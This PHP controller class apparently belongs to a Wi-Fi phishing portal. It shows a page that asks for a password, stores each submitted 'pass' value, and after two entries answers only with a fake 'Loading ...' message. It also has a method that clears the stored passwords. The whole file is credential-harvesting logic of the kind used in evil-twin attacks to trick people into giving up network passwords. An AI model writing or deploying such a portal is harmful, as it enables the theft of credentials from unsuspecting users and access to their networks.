<?php

namespace App\Controllers;

use System\Core\Controller;
use App\Models\Wifi;

class IndexCtrl extends Controller
{

    public function index()
    {
        if (Wifi::count() >= 2)
        {
            return $this->json('Loading ...');
        }
        else
        {
            $this->view->set('web/index');
        }
    }

    public function savePassword()
    {
        Wifi::write($this->request->getParsedBody()['pass']);
        return $this->redirect('/');
    }

    public function clearPasswords()
    {
        Wifi::clear();
        return $this->redirect('/');
    }

}
